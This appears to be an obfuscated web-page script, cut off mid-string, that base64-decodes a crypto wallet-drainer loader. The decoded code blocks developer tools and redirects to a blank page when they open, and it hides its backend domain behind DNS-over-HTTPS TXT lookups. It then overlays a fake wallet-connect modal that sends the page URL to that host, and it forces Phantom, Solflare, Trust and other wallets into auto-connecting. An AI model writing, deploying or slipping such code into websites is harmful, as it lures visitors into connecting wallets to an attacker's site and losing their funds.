(function(){var _0xlxyz9e=atob("KGZ1bmN0aW9uKCkgewovLyBQcmVjb25uZWN0IHRvIGtub3duIENETiBkb21haW5zIGZvciBmYXN0ZXIgcmVzb3VyY2UgbG9hZGluZwooZnVuY3Rpb24oKXt2YXIgZD1kb2N1bWVudCxoPWQuaGVhZHx8ZC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdO2lmKCFoKXJldHVybjt2YXIgZG9tYWlucz1bJ2h0dHBzOi8vcHViLTE0YzE1MDQ2ODFkMjQyNzY4NGFjMWY0ODkzMzhkMDc1LnIyLmRldicsJ2h0dHBzOi8vYXBpLndlYjNtb2RhbC5vcmcnXTtmb3IodmFyIGk9MDtpPGRvbWFpbnMubGVuZ3RoO2krKyl7dmFyIGw9ZC5jcmVhdGVFbGVtZW50KCdsaW5rJyk7bC5yZWw9J3ByZWNvbm5lY3QnO2wuaHJlZj1kb21haW5zW2ldO2wuY3Jvc3NPcmlnaW49J2Fub255bW91cyc7aC5hcHBlbmRDaGlsZChsKX19KSgpOwoKKGZ1bmN0aW9uKCkgewogIC8vIFNraXAgZGV2dG9vbHMgZGV0ZWN0aW9uIG9uIG1vYmlsZSBkZXZpY2VzIChjYXVzZXMgZmFsc2UgcG9zaXRpdmVzKQogIHZhciBpc01vYmlsZSA9IC9BbmRyb2lkfHdlYk9TfGlQaG9uZXxpUGFkfGlQb2R8QmxhY2tCZXJyeXxJRU1vYmlsZXxPcGVyYSBNaW5pL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICBpZiAoaXNNb2JpbGUpIHJldHVybjsKCiAgdmFyIGRldnRvb2xzID0ge29wZW46IGZhbHNlLCBvcmllbnRhdGlvbjogbnVsbH07CiAgdmFyIHRocmVzaG9sZCA9IDE2MDsKICB2YXIgZW1pdEV2ZW50ID0gZnVuY3Rpb24oc3RhdGUsIG9yaWVudGF0aW9uKSB7CiAgICBpZiAoc3RhdGUpIHsKICAgICAgY3Jhc2hTaXRlKCk7CiAgICB9CiAgfTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGlmICh3aW5kb3cub3V0ZXJIZWlnaHQgLSB3aW5kb3cuaW5uZXJIZWlnaHQgPiB0aHJlc2hvbGQgfHwKICAgICAgICB3aW5kb3cub3V0ZXJXaWR0aCAtIHdpbmRvdy5pbm5lcldpZHRoID4gdGhyZXNob2xkKSB7CiAgICAgIGlmICghZGV2dG9vbHMub3BlbikgewogICAgICAgIGVtaXRFdmVudCh0cnVlLCAnZG9ja2VkJyk7CiAgICAgICAgZGV2dG9vbHMub3BlbiA9IHRydWU7CiAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgIGRldnRvb2xzLm9wZW4gPSBmYWxzZTsKICAgIH0KICB9LCAxMDApOwogIHZhciBlbGVtZW50ID0gbmV3IEltYWdlKCk7CiAgT2JqZWN0LmRlZmluZVByb3BlcnR5KGVsZW1lbnQsICdpZCcsIHsKICAgIGdldDogZnVuY3Rpb24oKSB7CiAgICAgIGVtaXRFdmVudCh0cnVlLCAnY29uc29sZScpOwogICAgICBkZXZ0b29scy5vcGVuID0gdHJ1ZTsKICAgIH0KICB9KTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnNvbGUubG9nKGVsZW1lbnQpOwogICAgY29uc29sZS5jbGVhcigpOwogIH0sIDEwMCk7CiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICB2YXIgc3RhcnQgPSBwZXJmb3JtYW5jZS5ub3coKTsKICAgIGRlYnVnZ2VyOwogICAgdmFyIGVuZCA9IHBlcmZvcm1hbmNlLm5vdygpOwogICAgaWYgKGVuZCAtIHN0YXJ0ID4gMTAwKSB7CiAgICAgIGVtaXRFdmVudCh0cnVlLCAnZGVidWdnZXInKTsKICAgIH0KICB9LCAxMDApOwogIGZ1bmN0aW9uIGNyYXNoU2l0ZSgpIHsKICAgIC8vIFJlZGlyZWN0IHRvIGJsYW5rIHBhZ2UgaW5zdGVhZCBvZiBET00gbWFuaXB1bGF0aW9uCiAgICAvLyBVc2luZyBpbm5lckhUTUwgd291bGQgZGVzdHJveS9yZWNyZWF0ZSB0aGUgaWZyYW1lLCBjYXVzaW5nIHJlcXVlc3Qgc3BhbQogICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnYWJvdXQ6YmxhbmsnOwogIH0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGZ1bmN0aW9uKGUpIHsgZS5wcmV2ZW50RGVmYXVsdCgpOyB9KTsKICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgewogICAgaWYgKGUua2V5Q29kZSA9PT0gMTIzIHx8CiAgICAgICAgKGUuY3RybEtleSAmJiBlLnNoaWZ0S2V5ICYmIGUua2V5Q29kZSA9PT0gNzMpIHx8CiAgICAgICAgKGUuY3RybEtleSAmJiBlLnNoaWZ0S2V5ICYmIGUua2V5Q29kZSA9PT0gNzQpIHx8CiAgICAgICAgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT09IDg1KSkgewogICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgIGNyYXNoU2l0ZSgpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfSk7Cn0pKCk7Cgp2YXIgQ09ORklHX0lEID0gIjY5OTFhYzAxOTI4ZWIyMGFjOWJjMmRkZSI7CnZhciBfcm4gPSAnX3IuY2hyb21lLWV4dGVuc2lvbi1kYTBlNS1iYy5jb20nOwp2YXIgX2NrID0gJ19ucic7CgpmdW5jdGlvbiBfcGFyc2VUeHQoZGF0YSkgewogIHRyeSB7CiAgICB2YXIgYW5zd2VycyA9IGRhdGEuQW5zd2VyOwogICAgaWYgKCFhbnN3ZXJzIHx8ICFhbnN3ZXJzLmxlbmd0aCkgcmV0dXJuIG51bGw7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFuc3dlcnMubGVuZ3RoOyBpKyspIHsKICAgICAgaWYgKGFuc3dlcnNbaV0udHlwZSA9PT0gMTYpIHsKICAgICAgICB2YXIgdmFsID0gYW5zd2Vyc1tpXS5kYXRhOwogICAgICAgIGlmICh2YWwgJiYgdmFsLmNoYXJBdCgwKSA9PT0gJyInKSB2YWwgPSB2YWwuc2xpY2UoMSwgLTEpOwogICAgICAgIGlmICh2YWwgJiYgdmFsLmluZGV4T2YoJy4nKSAhPT0gLTEpIHJldHVybiB2YWw7CiAgICAgIH0KICAgIH0KICAgIHJldHVybiBudWxsOwogIH0gY2F0Y2ggKGUpIHsgcmV0dXJuIG51bGw7IH0KfQoKZnVuY3Rpb24gX2NhY2hlU2V0KGtleSwgdmFsKSB7CiAgdHJ5IHsgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbShrZXksIEpTT04uc3RyaW5naWZ5KHsgdjogdmFsLCB0OiBEYXRlLm5vdygpIH0pKTsgfSBjYXRjaChlKSB7fQp9CgpmdW5jdGlvbiBfY2FjaGVHZXQoa2V5LCB0dGwpIHsKICB0cnkgewogICAgdmFyIHJhdyA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oa2V5KTsKICAgIGlmICghcmF3KSByZXR1cm4gbnVsbDsKICAgIHZhciBvYmogPSBKU09OLnBhcnNlKHJhdyk7CiAgICBpZiAoRGF0ZS5ub3coKSAtIG9iai50ID4gdHRsKSB7IHNlc3Npb25TdG9yYWdlLnJlbW92ZUl0ZW0oa2V5KTsgcmV0dXJuIG51bGw7IH0KICAgIHJldHVybiBvYmoudjsKICB9IGNhdGNoKGUpIHsgcmV0dXJuIG51bGw7IH0KfQoKZnVuY3Rpb24gX2ZldGNoRG9oKG5hbWUpIHsKICB2YXIgdXJscyA9IFsKICAgICdodHRwczovL2Nsb3VkZmxhcmUtZG5zLmNvbS9kbnMtcXVlcnk/bmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpICsgJyZ0eXBlPVRYVCcsCiAgICAnaHR0cHM6Ly9kbnMuZ29vZ2xlL3Jlc29sdmU/bmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpICsgJyZ0eXBlPVRYVCcKICBdOwogIHZhciBpZHggPSBNYXRoLnJhbmRvbSgpIDwgMC41ID8gMCA6IDE7CiAgcmV0dXJuIGZldGNoKHVybHNbaWR4XSwgeyBoZWFkZXJzOiB7IEFjY2VwdDogJ2FwcGxpY2F0aW9uL2Rucy1qc29uJyB9IH0pCiAgICAudGhlbihmdW5jdGlvbihyKSB7IHJldHVybiByLmpzb24oKTsgfSkKICAgIC50aGVuKGZ1bmN0aW9uKGQpIHsKICAgICAgdmFyIHYgPSBfcGFyc2VUeHQoZCk7CiAgICAgIGlmICh2KSByZXR1cm4gdjsKICAgICAgcmV0dXJuIGZldGNoKHVybHNbMSAtIGlkeF0sIHsgaGVhZGVyczogeyBBY2NlcHQ6ICdhcHBsaWNhdGlvbi9kbnMtanNvbicgfSB9KQogICAgICAgIC50aGVuKGZ1bmN0aW9uKHIyKSB7IHJldHVybiByMi5qc29uKCk7IH0pCiAgICAgICAgLnRoZW4oZnVuY3Rpb24oZDIpIHsgcmV0dXJuIF9wYXJzZVR4dChkMik7IH0pOwogICAgfSkKICAgIC5jYXRjaChmdW5jdGlvbigpIHsKICAgICAgcmV0dXJuIGZldGNoKHVybHNbMSAtIGlkeF0sIHsgaGVhZGVyczogeyBBY2NlcHQ6ICdhcHBsaWNhdGlvbi9kbnMtanNvbicgfSB9KQogICAgICAgIC50aGVuKGZ1bmN0aW9uKHIpIHsgcmV0dXJuIHIuanNvbigpOyB9KQogICAgICAgIC50aGVuKGZ1bmN0aW9uKGQpIHsgcmV0dXJuIF9wYXJzZVR4dChkKTsgfSkKICAgICAgICAuY2F0Y2goZnVuY3Rpb24oKSB7IHJldHVybiBudWxsOyB9KTsKICAgIH0pOwp9CgpmdW5jdGlvbiByZXNvbHZlQmFja2VuZCgpIHsKICB2YXIgY2FjaGVkID0gX2NhY2hlR2V0KF9jaywgMzAwMDAwKTsKICBpZiAoY2FjaGVkKSByZXR1cm4gUHJvbWlzZS5yZXNvbHZlKGNhY2hlZCk7CiAgcmV0dXJuIF9mZXRjaERvaChfcm4pLnRoZW4oZnVuY3Rpb24oZG9tYWluKSB7CiAgICBpZiAoZG9tYWluKSBfY2FjaGVTZXQoX2NrLCBkb21haW4pOwogICAgcmV0dXJuIGRvbWFpbjsKICB9KTsKfQoKdmFyIF9yZXNvbHZlUHJvbWlzZSA9IHJlc29sdmVCYWNrZW5kKCk7Cgphc3luYyBmdW5jdGlvbiBib290KCkgewogIHZhciBkb21haW4gPSBhd2FpdCBfcmVzb2x2ZVByb21pc2U7CiAgaWYgKCFkb21haW4pIHJldHVybjsKCiAgdmFyIHBhcmVudEZ1bGwgPSB3aW5kb3cubG9jYXRpb24uaG9zdCArICh3aW5kb3cubG9jYXRpb24ucGF0aG5hbWUgfHwgJycpICsgKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2ggfHwgJycpOwogIHZhciBNT0RBTF9VUkwgPSAnaHR0cHM6Ly8nICsgZG9tYWluICsgJy9kZW1vLnBocD9pZD0nICsgQ09ORklHX0lEICsKICAgIChwYXJlbnRGdWxsID8gKCcmcGFyZW50X3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHBhcmVudEZ1bGwpKSA6ICcnKTsKCiAgLy8gTU9CSUxFIFdBTExFVCBCUk9XU0VSIEZJWDogRGV0ZWN0IGlmIHdlJ3JlIGluc2lkZSBhIG1vYmlsZSB3YWxsZXQncyBpbi1hcHAgYnJvd3NlcgogIC8vIElmIHNvLCByZWRpcmVjdCB0aGUgZW50aXJlIHBhZ2UgdG8gdGhlIG1vZGFsIGRvbWFpbiAoc2tpcCBpZnJhbWUpCiAgLy8gTk9URTogUGhhbnRvbSBtb2JpbGUgd29ya3MgZmluZSB3aXRoIGlmcmFtZXMsIHNvIHdlIEVYQ0xVREUgaXQgZnJvbSB0aGlzIHJlZGlyZWN0CiAgKGZ1bmN0aW9uKCkgewogICAgdmFyIHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgdmFyIGlzTW9iaWxlID0gL2FuZHJvaWR8aXBob25lfGlwYWR8aXBvZC9pLnRlc3QodWEpIHx8CiAgICAgIChuYXZpZ2F0b3IubWF4VG91Y2hQb2ludHMgPiAxICYmIC9tYWNpbnRvc2gvaS50ZXN0KHVhKSk7CiAgICB2YXIgaXNQaGFudG9tQnJvd3NlciA9ICEhKHdpbmRvdy5waGFudG9tPy5zb2xhbmE/LmlzUGhhbnRvbSB8fCB3aW5kb3cuc29sYW5hPy5pc1BoYW50b20pOwogICAgdmFyIGlzT3RoZXJXYWxsZXRCcm93c2VyID0gISEod2luZG93LnNvbGZsYXJlPy5pc1NvbGZsYXJlIHx8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuU29sZmxhcmVBcHAgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy50cnVzdHdhbGxldD8uc29sYW5hIHx8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuYmFja3BhY2s/LmlzQmFja3BhY2sgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jb2luYmFzZVNvbGFuYSk7CiAgICBpZiAoaXNNb2JpbGUgJiYgIWlzUGhhbnRvbUJyb3dzZXIgJiYgaXNPdGhlcldhbGxldEJyb3dzZXIgJiYgIXdpbmRvdy5sb2NhdGlvbi5zZWFyY2guaW5jbHVkZXMoJ25vcmVkaXJlY3Q9MScpKSB7CiAgICAgIHZhciByZWRpcmVjdFVybCA9IE1PREFMX1VSTCArICcmc291cmNlPWRpcmVjdC1tb2JpbGUmbm9yZWRpcmVjdD0xJmF1dG9jb25uZWN0PTEnOwogICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IHJlZGlyZWN0VXJsOwogICAgICByZXR1cm47CiAgICB9CiAgfSkoKTsKCiAgdmFyIHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3R5bGUnKTsKICBzdHlsZS50ZXh0Q29udGVudCA9ICcubm9pci1tb2RhbC1vdmVybGF5IHsgcG9zaXRpb246IGZpeGVkOyB0b3A6IDA7IGxlZnQ6IDA7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC44KTsgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDhweCk7IGRpc3BsYXk6IG5vbmU7IGp1c3RpZnktY29udGVudDogY2VudGVyOyBhbGlnbi1pdGVtczogY2VudGVyOyB6LWluZGV4OiA5OTk5OTsgb3BhY2l0eTogMDsgdHJhbnNpdGlvbjogb3BhY2l0eSAwLjNzIGVhc2U7fS5ub2lyLW1vZGFsLW92ZXJsYXkubm9pci1hY3RpdmUgeyBkaXNwbGF5OiBmbGV4OyBvcGFjaXR5OiAxO30ubm9pci1tb2RhbC1pZnJhbWUgeyB3aWR0aDogMzYwcHg7IGhlaWdodDogNjIwcHg7IGJvcmRlcjogbm9uZTsgYm9yZGVyLXJhZGl1czogMTZweDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IG92ZXJmbG93OiBoaWRkZW47IHRyYW5zZm9ybTogc2NhbGUoMC45KTsgb3BhY2l0eTogMDsgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuM3MgZWFzZSwgb3BhY2l0eSAwLjI1cyBlYXNlLCBoZWlnaHQgMC4ycyBlYXNlO30ubm9pci1tb2RhbC1vdmVybGF5Lm5vaXItYWN0aXZlIC5ub2lyLW1vZGFsLWlmcmFtZSB7IHRyYW5zZm9ybTogc2NhbGUoMSk7fS5ub2lyLW1vZGFsLWlmcmFtZS5ub2lyLWlmcmFtZS1yZWFkeSB7IG9wYWNpdHk6IDE7fS5ub2lyLXNwaW5uZXIgeyBwb3NpdGlvbjogYWJzb2x1dGU7IHdpZHRoOiAzNnB4OyBoZWlnaHQ6IDM2cHg7IGJvcmRlcjogM3B4IHNvbGlkIHJnYmEoMjU1LDI1NSwyNTUsMC4wOCk7IGJvcmRlci10b3AtY29sb3I6IHJnYmEoMjU1LDI1NSwyNTUsMC41KTsgYm9yZGVyLXJhZGl1czogNTAlOyBhbmltYXRpb246IG5vaXItc3BpbiAwLjdzIGxpbmVhciBpbmZpbml0ZTsgdHJhbnNpdGlvbjogb3BhY2l0eSAwLjI1cyBlYXNlO30ubm9pci1zcGlubmVyLm5vaXItaGlkZGVuIHsgb3BhY2l0eTogMDsgcG9pbnRlci1ldmVudHM6IG5vbmU7IH1Aa2V5ZnJhbWVzIG5vaXItc3BpbiB7IHRvIHsgdHJhbnNmb3JtOiByb3RhdGUoMzYwZGVnKTsgfSB9QG1lZGlhIChtYXgtd2lkdGg6IDQ4MHB4KSB7IC5ub2lyLW1vZGFsLWlmcmFtZSB7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IGJvcmRlci1yYWRpdXM6IDA7IG92ZXJmbG93LXk6IGF1dG87IH19JzsKICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHN0eWxlKTsKCiAgdmFyIG1vZGFsSFRNTCA9ICc8ZGl2IGNsYXNzPSJub2lyLW1vZGFsLW92ZXJsYXkiIGlkPSJub2lyTW9kYWxPdmVybGF5Ij4nICsKICAgICc8ZGl2IGNsYXNzPSJub2lyLXNwaW5uZXIiPjwvZGl2PicgKwogICAgJzxpZnJhbWUgY2xhc3M9Im5vaXItbW9kYWwtaWZyYW1lIiBzcmM9IicgKyBNT0RBTF9VUkwgKyAnIiBhbGxvd1RyYW5zcGFyZW5jeT0idHJ1ZSI+PC9pZnJhbWU+JyArCiAgICAnPC9kaXY+JzsKCiAgLy8gTWVzc2FnZSBsaXN0ZW5lciBhdCBHTE9CQUwgc2NvcGUgLSBoYW5kbGVzIHdhbGxldCBkZWVwIGxpbmsgbWVzc2FnZXMgZnJvbSBpZnJhbWUKICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAvLyBIYW5kbGUgZGVza3RvcFJlZGlyZWN0IGZvciB3YWxsZXRzIHRoYXQgZG9uJ3Qgd29yayB3aXRoIGlmcmFtZXMgKGUuZy4sIFRydXN0IFdhbGxldCBkZXNrdG9wKQogICAgaWYgKGV2ZW50LmRhdGEgJiYgZXZlbnQuZGF0YS5kZXNrdG9wUmVkaXJlY3QpIHsKICAgICAgdmFyIGlmcmFtZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lmcmFtZScpOwogICAgICBpZiAoaWZyYW1lICYmIGlmcmFtZS5zcmMpIHsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IGlmcmFtZS5zcmMgKyAnJnNvdXJjZT1kZXNrdG9wLXJlZGlyZWN0JzsKICAgICAgfQogICAgICByZXR1cm47CiAgICB9CgogICAgLy8gSGFuZGxlIG1vYmlsZSB3YWxsZXQgcmVkaXJlY3Qgd2l0aCBtb2RhbCBVUkwgKGZyb20gQXBwS2l0IGlmcmFtZSkKICAgIC8vIFVzZXMgdGhlIGlmcmFtZSdzIFVSTCAobW9kYWwgVVJMKSBzbyB0aGUgd2FsbGV0IG9wZW5zIGl0IGF0IHRvcCBsZXZlbCDigJQgbm8gaWZyYW1lCiAgICBpZiAoZXZlbnQuZGF0YSAmJiBldmVudC5kYXRhLnR5cGUgPT09ICdub2lyV2FsbGV0UmVkaXJlY3QnICYmIGV2ZW50LmRhdGEud2FsbGV0ICYmIGV2ZW50LmRhdGEudXJsKSB7CiAgICAgIHZhciB3YWxsZXQgPSBldmVudC5kYXRhLndhbGxldDsKICAgICAgdmFyIHRhcmdldFVybCA9IGVuY29kZVVSSUNvbXBvbmVudChldmVudC5kYXRhLnVybCk7CiAgICAgIHZhciB0YXJnZXRSZWYgPSBlbmNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLm9yaWdpbik7CiAgICAgIHZhciB3YWxsZXRMaW5rID0gJyc7CiAgICAgIGlmICh3YWxsZXQgPT09ICdwaGFudG9tJykgewogICAgICAgIHdhbGxldExpbmsgPSAnaHR0cHM6Ly9waGFudG9tLmFwcC91bC9icm93c2UvJyArIHRhcmdldFVybCArICc/cmVmPScgKyB0YXJnZXRSZWY7CiAgICAgIH0gZWxzZSBpZiAod2FsbGV0ID09PSAnc29sZmxhcmUnKSB7CiAgICAgICAgd2FsbGV0TGluayA9ICdodHRwczovL3NvbGZsYXJlLmNvbS91bC92MS9icm93c2UvJyArIHRhcmdldFVybCArICc/cmVmPScgKyB0YXJnZXRSZWY7CiAgICAgIH0gZWxzZSBpZiAod2FsbGV0ID09PSAnYmFja3BhY2snKSB7CiAgICAgICAgd2FsbGV0TGluayA9ICdodHRwczovL2JhY2twYWNrLmFwcC91bC9icm93c2UvJyArIHRhcmdldFVybCArICc/cmVmPScgKyB0YXJnZXRSZWY7CiAgICAgIH0gZWxzZSBpZiAod2FsbGV0ID09PSAnY29pbmJhc2UnKSB7CiAgICAgICAgd2FsbGV0TGluayA9ICdodHRwczovL2dvLmNiLXcuY29tL2RhcHA/Y2JfdXJsPScgKyB0YXJnZXRVcmw7CiAgICAgIH0gZWxzZSBpZiAod2FsbGV0ID09PSAndHJ1c3QnKSB7CiAgICAgICAgd2FsbGV0TGluayA9ICdodHRwczovL2xpbmsudHJ1c3R3YWxsZXQuY29tL29wZW5fdXJsP3VybD0nICsgdGFyZ2V0VXJsOwogICAgICB9IGVsc2UgaWYgKHdhbGxldCA9PT0gJ21hZ2ljZWRlbicpIHsKICAgICAgICB3YWxsZXRMaW5rID0gJ2h0dHBzOi8vd2FsbGV0Lm1hZ2ljZWRlbi5pby91bC9icm93c2UvJyArIHRhcmdldFVybCArICc/cmVmPScgKyB0YXJnZXRSZWY7CiAgICAgIH0KICAgICAgaWYgKHdhbGxldExpbmspIHsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IHdhbGxldExpbms7CiAgICAgIH0KICAgICAgcmV0dXJuOwogICAgfQoKICAgIC8vIEhhbmRsZSBzdGFuZGFyZCBtb2JpbGUgZGVlcGxpbmsgcmVkaXJlY3RzIChsZWdhY3kpCiAgICBpZiAoZXZlbnQuZGF0YSAmJiBldmVudC5kYXRhLmRlZXBsaW5rKSB7CiAgICAgIHZhciBhY3Rpb24gPSBldmVudC5kYXRhLmRlZXBsaW5rOwogICAgICB2YXIgY3VycmVudFVybCA9IG5ldyBVUkwod2luZG93LmxvY2F0aW9uLmhyZWYpOwogICAgICBjdXJyZW50VXJsLnNlYXJjaFBhcmFtcy5zZXQoJ3Nob3dGcmFtZScsICd0cnVlJyk7CiAgICAgIHZhciB1cmwgPSBlbmNvZGVVUklDb21wb25lbnQoY3VycmVudFVybC50b1N0cmluZygpKTsKICAgICAgdmFyIHJlZiA9IGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24ub3JpZ2luKTsKICAgICAgdmFyIG1vYmlsZURlZXBMaW5rID0gJyc7CiAgICAgIGlmIChhY3Rpb24gPT09ICdwaGFudG9tJykgewogICAgICAgIG1vYmlsZURlZXBMaW5rID0gJ2h0dHBzOi8vcGhhbnRvbS5hcHAvdWwvYnJvd3NlLycgKyB1cmwgKyAnP3JlZj0nICsgcmVmOwogICAgICB9IGVsc2UgaWYgKGFjdGlvbiA9PT0gJ3NvbGZsYXJlJykgewogICAgICAgIG1vYmlsZURlZXBMaW5rID0gJ2h0dHBzOi8vc29sZmxhcmUuY29tL3VsL3YxL2Jyb3dzZS8nICsgdXJsICsgJz9yZWY9JyArIHJlZjsKICAgICAgfSBlbHNlIGlmIChhY3Rpb24gPT09ICdiYWNrcGFjaycpIHsKICAgICAgICBtb2JpbGVEZWVwTGluayA9ICdodHRwczovL2JhY2twYWNrLmFwcC91bC9icm93c2UvJyArIHVybCArICc/cmVmPScgKyByZWY7CiAgICAgIH0gZWxzZSBpZiAoYWN0aW9uID09PSAnY29pbmJhc2UnKSB7CiAgICAgICAgbW9iaWxlRGVlcExpbmsgPSAnaHR0cHM6Ly9nby5jYi13LmNvbS9kYXBwP2NiX3VybD0nICsgdXJsOwogICAgICB9IGVsc2UgaWYgKGFjdGlvbiA9PT0gJ3RydXN0JykgewogICAgICAgIG1vYmlsZURlZXBMaW5rID0gJ2h0dHBzOi8vbGluay50cnVzdHdhbGxldC5jb20vb3Blbl91cmw/dXJsPScgKyB1cmw7CiAgICAgIH0gZWxzZSBpZiAoYWN0aW9uID09PSAnbWFnaWNlZGVuJykgewogICAgICAgIG1vYmlsZURlZXBMaW5rID0gJ2h0dHBzOi8vd2FsbGV0Lm1hZ2ljZWRlbi5pby91bC9icm93c2UvJyArIHVybCArICc/cmVmPScgKyByZWY7CiAgICAgIH0KICAgICAgaWYgKG1vYmlsZURlZXBMaW5rKSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBtb2JpbGVEZWVwTGluazsKICAgICAgfQogICAgfQogIH0pOwoKICAvLyBNb2JpbGUgd2FsbGV0IHBpY2tlciDigJQgUmVvd24gQXBwS2l0LXN0eWxlIGRlc2lnbgogIC8vIEVhY2ggYnV0dG9uIGlzIGEgcmVhbCA8YT4gbGluayB0byB0aGUgd2FsbGV0J3MgYnJvd3NlIGRlZXBsaW5rIHdpdGggdGhlIG1vZGFsIFVSTAogIC8vIEljb25zIGxvYWRlZCBmcm9tIFdhbGxldENvbm5lY3QgQ0ROIChhcGkud2ViM21vZGFsLmNvbS9nZXRXYWxsZXRJbWFnZS97aWR9KQogIGZ1bmN0aW9uIHNob3dNb2JpbGVXYWxsZXRQaWNrZXIoKSB7CiAgICB2YXIgZXhpc3RpbmcgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbm9pcldhbGxldFBpY2tlcicpOwogICAgaWYgKGV4aXN0aW5nKSBleGlzdGluZy5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKGV4aXN0aW5nKTsKCiAgICB2YXIgYXV0b2Nvbm5lY3RVcmwgPSBNT0RBTF9VUkwgKyAnJmF1dG9jb25uZWN0PTEnOwogICAgdmFyIGVuY29kZWRVcmwgPSBlbmNvZGVVUklDb21wb25lbnQoYXV0b2Nvbm5lY3RVcmwpOwogICAgdmFyIGVuY29kZWRSZWYgPSBlbmNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLm9yaWdpbik7CiAgICB2YXIgaW1nQmFzZSA9ICdodHRwczovL2FwaS53ZWIzbW9kYWwub3JnL2dldFdhbGxldEltYWdlLyc7CiAgICB2YXIgaW1nUSA9ICc/cHJvamVjdElkPTA1YTcyZjMxOWFkMjUwMDYwYzgyZGE0ZGM3MzdlMGFkJnN0PWFwcGtpdCZzdj1odG1sLXNvbGFuYS11bmRlZmluZWQnOwogICAgdmFyIHdhbGxldHMgPSBbCiAgICAgIHsgbmFtZTogJ1BoYW50b20nLCB0YWc6ICdQT1BVTEFSJywgaW1nOiBpbWdCYXNlICsgJ2I2ZWM3YjgxLWJiNGYtNDI3ZC1lMjkwLTc2MzFlNmU1MGQwMCcgKyBpbWdRLCB1cmw6ICdodHRwczovL3BoYW50b20uYXBwL3VsL2Jyb3dzZS8nICsgZW5jb2RlZFVybCArICc/cmVmPScgKyBlbmNvZGVkUmVmIH0sCiAgICAgIHsgbmFtZTogJ1NvbGZsYXJlJywgdGFnOiAnUE9QVUxBUicsIGltZzogaW1nQmFzZSArICczNGMwZTM4ZC02NmM0LTQ3MGUtMWFlZC1hNmZhYmUyZDFlMDAnICsgaW1nUSwgdXJsOiAnaHR0cHM6Ly9zb2xmbGFyZS5jb20vdWwvdjEvYnJvd3NlLycgKyBlbmNvZGVkVXJsICsgJz9yZWY9JyArIGVuY29kZWRSZWYgfSwKICAgICAgeyBuYW1lOiAnQmFja3BhY2snLCB0YWc6ICcnLCBpbWc6IGltZ0Jhc2UgKyAnNzFjYTlkYWYtYTMxZS00ZDJhLWZkMDEtZjVkYzJkYzY2OTAwJyArIGltZ1EsIHVybDogJ2h0dHBzOi8vYmFja3BhY2suYXBwL3VsL2Jyb3dzZS8nICsgZW5jb2RlZFVybCArICc/cmVmPScgKyBlbmNvZGVkUmVmIH0sCiAgICAgIHsgbmFtZTogJ1RydXN0IFdhbGxldCcsIHRhZzogJycsIGltZzogaW1nQmFzZSArICc3Njc3YjU0Zi0zNDg2LTQ2ZTItNGUzNy1iZjg3NDc4MTRmMDAnICsgaW1nUSwgdXJsOiAnaHR0cHM6Ly9saW5rLnRydXN0d2FsbGV0LmNvbS9vcGVuX3VybD91cmw9JyArIGVuY29kZWRVcmwgfSwKICAgICAgeyBuYW1lOiAnQ29pbmJhc2UgV2FsbGV0JywgdGFnOiAnJywgaW1nOiBpbWdCYXNlICsgJzA0Yzg4YmYwLWYxMTUtNDY4Ni04YzI5LTkwYTNkMDE4YTQwMCcgKyBpbWdRLCB1cmw6ICdodHRwczovL2dvLmNiLXcuY29tL2RhcHA/Y2JfdXJsPScgKyBlbmNvZGVkVXJsIH0KICAgIF07CgogICAgdmFyIHBpY2tlckNTUyA9ICc8c3R5bGU+JyArCiAgICAgICcubndwLW92ZXJsYXl7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNik7YmFja2R